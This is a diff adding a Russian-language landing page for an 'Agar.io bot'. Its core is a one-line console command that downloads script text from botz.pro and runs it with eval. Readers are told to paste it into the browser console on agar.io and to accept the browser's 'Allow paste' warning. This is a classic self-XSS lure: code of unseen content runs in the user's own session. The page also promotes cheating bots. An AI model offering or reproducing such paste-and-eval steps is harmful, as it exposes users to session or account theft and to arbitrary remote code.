@@ -1,0 +1,129 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Agar.io Bot 2025</title>
+    <style>
+        :root {--bg:#fff; --text:#000; --card:#f8f9fa; --border:#ddd; --accent:#5b5bff;}
+        .dark {--bg:#0d0d0d; --text:#eee; --card:#1a1a1a; --border:#333; --accent:#7c7cff;}
+        *{margin:0;padding:0;box-sizing:border-box;text-decoration:none;user-select:none;}
+        body{font-family:system-ui,sans-serif;background:var(--bg);color:var(--text);line-height:1.6;transition:all .3s;}
+        .container{max-width:900px;margin:0 auto;padding:40px 20px;}
+        header{text-align:center;padding:80px 0 60px;}
+        h1{font-size:2.8rem;font-weight:800;}
+        .card{background:var(--card);border:1px solid var(--border);border-radius:16px;padding:32px;margin:30px 0;}
+        .script{user-select:text;background:#282828;color:white;padding:20px;border-radius:12px;font-family:consolas,monaco,monospace;font-size:1rem;overflow-x:auto;position:relative;margin:20px 0;}
+        .copy{position:absolute;top:10px;right:10px;background:var(--accent);color:#fff;border:none;padding:8px 14px;border-radius:8px;cursor:pointer;}
+        .theme{position:fixed;top:20px;right:20px;width:50px;height:50px;border-radius:50%;background:var(--card);border:1px solid var(--border);display:flex;align-items:center;justify-content:center;font-size:1.4rem;cursor:pointer;z-index:9999;}
+        .translate-widget{position:fixed;top:80px;right:20px;z-index:9998;}
+        footer{text-align:center;padding:60px 0;color:#777;font-size:.9rem;}
+
+        /* КАРТОЧКА СПОНСОРА С ФОНОВЫМ ВИДЕО */
+        .sponsor-card{
+            position: relative;
+            overflow: hidden;
+            border-radius: 20px;
+            margin: 40px 0;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.15);
+            color: #fff;
+            text-align: center;
+            padding: 40px 32px;
+        }
+        .sponsor-card::before{
+            content: "";
+            position: absolute;
+            inset: 0;
+            background: rgba(0,0,0,0.45);
+            z-index: 1;
+        }
+        .sponsor-video{
+            position: absolute;
+            top: 50%; left: 50%;
+            min-width: 100%; min-height: 100%;
+            width: auto; height: auto;
+            transform: translateX(-50%) translateY(-50%);
+            object-fit: cover;
+            z-index: 0;
+        }
+        .sponsor-content{
+            position: relative;
+            z-index: 2;
+        }
+        .sponsor-card h3{font-size:1.9rem;margin-bottom:12px;}
+        .sponsor-card p{font-size:1.15rem;margin-bottom:24px;opacity:0.95;}
+        .sponsor-btn{
+            background:#fff;color:#3260fd;padding:14px 36px;border-radius:50px;font-weight:bold;font-size:1.1rem;
+            display:inline-block;transition:.3s;
+        }
+        .sponsor-btn:hover{transform:scale(1.05);box-shadow:0 8px 20px rgba(0,0,0,0.3);}
+
+        .notranslate, .script, .copy, code, pre { translate: no !important; }
+    </style>
+</head>
+<body class="">
+    <div class="theme" onclick="document.body.classList.toggle('dark');this.innerHTML=document.body.classList.contains('dark')?'☀️':'🌙'">🌙</div>
+    <div class="translate-widget"><div id="google_translate_element"></div></div>
+
+    <header>
+        <h1>Ai Bot | Agar.io</h1>
+        <p>Рабочий скрипт ботов — просто вставь в консоль</p>
+    </header>
+
+    <div class="container">
+        <!-- Основной бот -->
+        <div class="card">
+            <div class="script notranslate" translate="no">
+                eval(await (await fetch('//botz.pro/b')).text());
+            </div>
+            <ol>
+                <li>Зайди на <a href="https://agar.io" target="_blank" style="font-weight:bold;color:#0074ff;">Agar.io</a></li>
+                <li>Нажми F12 → Console (Консоль)</li>
+                <li>Вставь скрипт в поле ввода → Enter</li>
+                <li>Если браузер спросит «Allow paste» — нажми Разрешить</li>
+            </ol>
+        </div>
+
+        <!-- КАРТОЧКА СПОНСОРА С ВИДЕО-ФОНОМ -->
+        <div class="card sponsor-card">
+            <video autoplay muted loop playsinline class="sponsor-video">
+                <source src="viedo.mp4" type="video/mp4">
+            </video>
+            <div class="sponsor-content">
+                <h3>🔥 Спонсор проекта — Agar.su</h3>
+                <p>Русская версия Агарио, кланами, кастомными скинами,<br>мини-играми и защитой от ботов.</p>
+                <a href="https://agar.su" target="_blank" class="sponsor-btn">Играть в Agar.su →</a>
+            </div>
+        </div>
+
+        <div class="card" style="background:rgba(255,0,0,0.08);border-left:4px solid #f55;">
+            <strong>Важно:</strong><br>
+            Чрезмерное использование ботов может привести к временной блокировке Agar.io по IP.
+        </div>
+    </div>
+
+    <footer>© 2025 • боты проверены и работают на ноябрь 2025</footer>
+
+    <!-- Google Translate -->
+    <script type="text/javascript">
+        function googleTranslateElementInit() {
+            new google.translate.TranslateElement({
+                pageLanguage: 'ru',
+                includedLanguages: 'en,es,pt,fr,de,it,pl,uk,tr,ar,hi,zh-CN,zh-TW,ja,ko,vi,th,id,ro,cs,nl,sv,da,no,fi,el,he,fa,bn,bg,hr,hu,sr,sk,lt,lv,et,sl',
+                layout: google.translate.TranslateElement.InlineLayout.SIMPLE,
+                autoDisplay: false
+            }, 'google_translate_element');
+        }
+    </script>
+    <script type="text/javascript" src="https://translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
+
+    <script>
+        // Тёмная тема
+        if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+            document.body.classList.add('dark');
+            document.querySelector('.theme').innerHTML = '☀️';
+        }
+
+    </script>
+</body>
+</html>
